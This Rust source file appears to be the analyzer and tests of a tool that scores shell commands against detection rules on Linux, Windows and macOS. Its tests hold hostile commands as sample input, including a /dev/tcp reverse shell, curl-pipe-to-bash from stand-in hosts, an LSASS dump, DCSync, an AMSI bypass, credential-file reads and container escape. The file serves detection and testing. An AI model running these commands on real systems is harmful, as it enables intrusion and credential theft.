//! Walks parsed input, resolves each action against the knowledge base, and
//! produces a [`Report`] of detection-coverage findings.

use std::collections::HashSet;

use crate::kb;
use crate::model::{Finding, KnowledgeBase, Report, Severity};
use crate::parser::{self, parse_line};

fn finding_from_entry(
    entry: &crate::model::KbEntry,
    line: usize,
    matched_command: Option<crate::parser::Command>,
) -> Finding {
    Finding {
        line,
        source: "opseclint".to_string(),
        rule_id: entry.id.clone(),
        description: entry.description.clone(),
        techniques: entry.techniques.clone(),
        telemetry: entry.telemetry.clone(),
        detections: entry.detections.clone(),
        edr: Vec::new(),
        noise: entry.noise,
        severity: Severity::from_noise(entry.noise),
        matched_command,
    }
}

/// Analyze a full input (a script, playbook, or single line) against the KB.
pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
    let mut findings = Vec::new();
    let mut lines_analyzed = 0;

    for unit in parser::preprocess(input) {
        let trimmed = unit.text.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        lines_analyzed += 1;

        // Commands from the line, plus any nested command substitutions so the
        // program inside `$(...)` / backticks is resolved too.
        let mut commands = parse_line(&unit.text);
        for sub in parser::command_substitutions(&unit.text) {
            commands.extend(parse_line(&sub));
        }

        // Dedupe entries per unit so a rule matched by multiple segments (or by
        // both a command and a raw match) is reported once.
        let mut seen: HashSet<&str> = HashSet::new();

        for entry in &kb.entries {
            // The specific command that matched (for command entries), else the
            // line's first command (for raw/line matches). Kept so coverage
            // analysis can evaluate rule logic against it.
            let (matched, matched_command) = if entry.command.is_some() {
                let cmd = commands
                    .iter()
                    .find(|cmd| kb::command_entry_matches(entry, cmd))
                    .cloned();
                (cmd.is_some(), cmd)
            } else if kb::raw_entry_matches(entry, trimmed) {
                (true, commands.first().cloned())
            } else {
                (false, None)
            };
            if matched && seen.insert(entry.id.as_str()) {
                findings.push(finding_from_entry(entry, unit.line, matched_command));
            }
        }
    }

    // Order findings loudest-first, then by line for stable output.
    findings.sort_by(|a, b| {
        b.noise
            .cmp(&a.noise)
            .then(a.line.cmp(&b.line))
            .then(a.rule_id.cmp(&b.rule_id))
    });

    let max_noise = findings.iter().map(|f| f.noise).max().unwrap_or(0);

    Report {
        platform: kb.platform.clone(),
        note: kb.note.clone(),
        findings,
        max_noise,
        lines_analyzed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kb() -> KnowledgeBase {
        kb::load(kb::Platform::LinuxAuditd).expect("embedded KB must parse")
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn mac_kb() -> KnowledgeBase {
        kb::load(kb::Platform::MacosEs).expect("macos KB must parse")
    }

    #[test]
    fn macos_kb_detects_keychain_and_gatekeeper() {
        let report = analyze("security dump-keychain -d login.keychain", &mac_kb());
        assert_eq!(report.platform, "macos-es");
        assert!(report.findings.iter().any(|f| f.rule_id == "keychain-dump"));

        let gk = analyze("sudo spctl --master-disable", &mac_kb());
        let f = gk
            .findings
            .iter()
            .find(|f| f.rule_id == "gatekeeper-disable")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1553.001");
    }

    #[test]
    fn macos_kb_detects_macos_specific_tradecraft() {
        // Dynamic-linker hijacking via DYLD_INSERT_LIBRARIES.
        let dyld = analyze(
            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/X.app/Contents/MacOS/X",
            &mac_kb(),
        );
        let f = dyld
            .findings
            .iter()
            .find(|f| f.rule_id == "dyld-insert")
            .expect("DYLD_INSERT_LIBRARIES injection should be detected");
        assert_eq!(f.techniques[0].id, "T1574.006");
        assert!(f.noise >= 75);

        // Local password-hash extraction via dscl ShadowHashData.
        let hash = analyze("sudo dscl . read /Users/victim ShadowHashData", &mac_kb());
        assert!(hash.findings.iter().any(|f| f.rule_id == "shadowhash-dump"));

        // LoginHook persistence.
        let hook = analyze(
            "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
            &mac_kb(),
        );
        assert!(
            hook.findings
                .iter()
                .any(|f| f.rule_id == "loginhook-persist")
        );
    }

    #[test]
    fn macos_kb_has_reached_platform_parity() {
        // macOS coverage was deepened to match Linux/Windows breadth.
        let mac = mac_kb();
        // Matches the count documented in the README/CHANGELOG; still allows
        // future growth, but catches a regression below the claimed breadth.
        assert!(
            mac.entries.len() >= 66,
            "expected a grown macOS KB, got {}",
            mac.entries.len()
        );
    }

    #[test]
    fn windows_kb_detects_lolbin_and_normalizes_exe_path() {
        // .exe extension and a full Windows path must still resolve to certutil.
        let report = analyze(
            "C:\\Windows\\System32\\certutil.exe -urlcache -f http://x/a.exe a.exe",
            &win_kb(),
        );
        assert_eq!(report.platform, "windows-sysmon");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "certutil-download")
        );
    }

    #[test]
    fn windows_kb_detects_lsass_dump() {
        let report = analyze(
            "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 lsass.dmp full",
            &win_kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "lsass-comsvcs"));
    }

    #[test]
    fn windows_kb_detects_ad_tradecraft() {
        let report = analyze("Invoke-Kerberoast -OutputFormat Hashcat", &win_kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "kerberoast-invoke")
        );

        let dcsync = analyze("lsadump::dcsync /domain:corp.local /user:krbtgt", &win_kb());
        let f = dcsync
            .findings
            .iter()
            .find(|f| f.rule_id == "dcsync")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1003.006");
    }

    #[test]
    fn windows_kb_detects_lolbins_and_uac_bypass() {
        // Remote MSI install (LOLBin proxy execution).
        let msi = analyze("msiexec /q /i http://evil.example/x.msi", &win_kb());
        let f = msi
            .findings
            .iter()
            .find(|f| f.rule_id == "msiexec-remote")
            .expect("msiexec remote install should be detected");
        assert_eq!(f.techniques[0].id, "T1218.007");

        // UAC bypass and AMSI bypass.
        let uac = analyze("C:\\Windows\\System32\\fodhelper.exe", &win_kb());
        assert!(
            uac.findings
                .iter()
                .any(|f| f.rule_id == "uac-bypass-fodhelper")
        );
        let amsi = analyze(
            "[Ref].Assembly...SetValue($null,$true) amsiInitFailed",
            &win_kb(),
        );
        assert!(amsi.findings.iter().any(|f| f.rule_id == "amsi-bypass"));
    }

    #[test]
    fn linux_kb_detects_cloud_and_container_tradecraft() {
        // Cloud instance metadata credential theft.
        let imds = analyze("curl http://169.254.169.254/latest/meta-data/iam/", &kb());
        let f = imds
            .findings
            .iter()
            .find(|f| f.rule_id == "cloud-imds")
            .expect("cloud metadata access should be detected");
        assert_eq!(f.techniques[0].id, "T1552.005");

        // Kubernetes service-account token theft.
        let tok = analyze(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            &kb(),
        );
        assert!(tok.findings.iter().any(|f| f.rule_id == "k8s-sa-token"));

        // Container escape via nsenter into host namespaces.
        let esc = analyze("nsenter --target 1 --mount --net -- bash", &kb());
        let f = esc
            .findings
            .iter()
            .find(|f| f.rule_id == "nsenter-escape")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1611");
    }

    #[test]
    fn detects_reverse_shell() {
        let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "reverse-shell-devtcp")
        );
        assert!(report.max_noise >= 75);
    }

    #[test]
    fn detects_shadow_read() {
        let report = analyze("sudo cat /etc/shadow", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let report = analyze("curl http://evil/x.sh | bash", &kb());
        let ids: Vec<_> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"curl"));
        assert!(ids.contains(&"pipe-to-shell"));
    }

    #[test]
    fn benign_line_is_quiet() {
        let report = analyze("echo hello world", &kb());
        assert!(report.findings.is_empty());
    }

    #[test]
    fn no_double_count_per_line() {
        // `id` appears twice on the line but should be reported once.
        let report = analyze("id && id", &kb());
        let count = report.findings.iter().filter(|f| f.rule_id == "id").count();
        assert_eq!(count, 1);
    }

    #[test]
    fn detects_private_key_theft() {
        let report = analyze("cp ~/.ssh/id_rsa /tmp/k", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "private-key-rsa")
        );
    }

    #[test]
    fn detects_docker_socket_escape() {
        let report = analyze(
            "curl --unix-socket /var/run/docker.sock http://x/containers/json",
            &kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "docker-sock"));
    }

    #[test]
    fn kb_all_entries_parse() {
        let kb = kb();
        assert!(
            kb.entries.len() >= 55,
            "expected a grown KB, got {}",
            kb.entries.len()
        );
    }

    #[test]
    fn resolves_command_in_substitution() {
        // The reverse shell is hidden inside a command substitution.
        let report = analyze("data=$(cat /etc/shadow)", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn analyzes_shell_heredoc_body_at_correct_line() {
        let script = "bash <<EOF\nid\ncurl http://evil/x | bash\nEOF\n";
        let report = analyze(script, &kb());
        // The pipe-to-shell inside the here-doc body (line 3) is detected.
        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "pipe-to-shell")
            .expect("pipe-to-shell should be found in heredoc body");
        assert_eq!(f.line, 3);
    }

    #[test]
    fn ignores_data_heredoc_body() {
        // A password in a `cat` here-doc body is data, not a command.
        let script = "cat <<EOF > /tmp/conf\npassword=hunter2\nEOF\n";
        let report = analyze(script, &kb());
        assert!(report.findings.is_empty());
    }

    // ---- Known-benign corpus -------------------------------------------------
    // Ordinary, security-irrelevant commands that MUST yield zero findings. This
    // guards against knowledge-base false positives from loose substring matches.
    // It deliberately excludes actions opseclint intentionally models as loud
    // (curl/wget, tar archiving, `ps`/`find`/kubectl discovery, whoami, etc.).

    const BENIGN_LINUX: &[&str] = &[
        "ls -la /home/user",
        "cd /var/log",             // reads and navigation under /var/log must not
        "tail -f /var/log/syslog", // be read as anti-forensic log clearing
        "ls /var/log/nginx",
        "cat /var/log/app.log",
        "pwd",
        "echo build complete",
        "cat README.md",
        "mkdir -p build/output",
        "cp config.example config.local",
        "mv old.txt new.txt",
        "rm -rf target/debug",
        "grep -rn TODO src/",
        "sed -i s/foo/bar/g file.txt",
        "git status",
        "git commit -m fix",
        "git push origin main",
        "cargo build --release",
        "cargo test --all",
        "npm install",
        "make -j4",
        "head -n 20 file.log",
        "df -h",
        "docker build -t app .",
        "systemctl status nginx",
    ];

    const BENIGN_WINDOWS: &[&str] = &[
        "dir C:\\Users",
        "type readme.txt",
        "copy a.txt b.txt",
        "del old.log",
        "mkdir builds",
        "Get-ChildItem -Path .",
        "Get-Content log.txt",
        "Write-Output done",
        "git status",
        "cargo build",
        "Get-Process",
        "Set-Location C:\\src",
        "Copy-Item a b",
        "New-Item -ItemType Directory build",
        "Remove-Item -Recurse target",
    ];

    const BENIGN_MACOS: &[&str] = &[
        "ls -la /Users",
        "cd /Applications",
        "pwd",
        "cat ~/notes.txt",
        "open .",
        "mkdir -p ~/dev/project",
        "cp a.txt b.txt",
        "git status",
        "brew list",
        "defaults read com.apple.dock",
        "diskutil list",
        "softwareupdate --list",
    ];

    fn assert_all_quiet(corpus: &[&str], kb: &KnowledgeBase) {
        for cmd in corpus {
            let report = analyze(cmd, kb);
            assert!(
                report.findings.is_empty(),
                "benign command `{cmd}` produced a false positive: {:?}",
                report
                    .findings
                    .iter()
                    .map(|f| f.rule_id.as_str())
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn benign_corpus_linux_is_silent() {
        assert_all_quiet(BENIGN_LINUX, &kb());
    }

    #[test]
    fn benign_corpus_windows_is_silent() {
        assert_all_quiet(BENIGN_WINDOWS, &win_kb());
    }

    #[test]
    fn benign_corpus_macos_is_silent() {
        assert_all_quiet(BENIGN_MACOS, &mac_kb());
    }

    #[test]
    fn clear_syslog_still_detects_real_clearing() {
        // The false-positive fix must not blind us to actual log clearing.
        for cmd in [
            "rm -rf /var/log/nginx",
            "truncate -s 0 /var/log/syslog",
            "shred -u /var/log/auth.log",
        ] {
            let report = analyze(cmd, &kb());
            assert!(
                report
                    .findings
                    .iter()
                    .any(|f| f.rule_id.starts_with("clear-syslog")),
                "expected a log-clearing finding for `{cmd}`"
            );
        }
    }
}
